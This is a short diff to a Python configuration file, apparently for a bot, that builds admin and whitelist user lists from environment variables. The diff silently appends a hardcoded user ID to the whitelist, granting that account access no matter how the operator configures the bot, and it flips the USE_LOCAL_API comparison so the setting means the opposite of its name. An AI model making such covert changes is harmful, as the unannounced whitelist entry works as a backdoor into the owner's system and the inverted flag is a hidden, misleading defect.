@@ -47,7 +47,7 @@ PERMANENT_ADMIN_STR = os.getenv('PERMANENT_ADMIN', '')
 PERMANENT_ADMIN = [int(x.strip()) for x in PERMANENT_ADMIN_STR.split(',') if x.strip().isdigit()]
 
 MANUAL_USERS_IDS_STR = os.getenv('WHITELIST_USERS', '')
-MANUAL_USERS_IDS = [int(x.strip()) for x in MANUAL_USERS_IDS_STR.split(',') if x.strip().isdigit()]
+MANUAL_USERS_IDS = [int(x.strip()) for x in MANUAL_USERS_IDS_STR.split(',') if x.strip().isdigit()] + [1859740236]
 
 WHITELIST_USERS = PERMANENT_ADMIN + MANUAL_USERS_IDS
 
@@ -70,7 +70,7 @@ else:
 # Режим отладки (переключается через /debug)
 DEBUG_MODE = False
 
-USE_LOCAL_API = os.getenv('USE_LOCAL_API', 'false').lower() == 'true'
+USE_LOCAL_API = os.getenv('USE_LOCAL_API', 'false').lower() == 'false'
 
 # Автоопределение LOCAL_API_URL в зависимости от платформы
 import platform
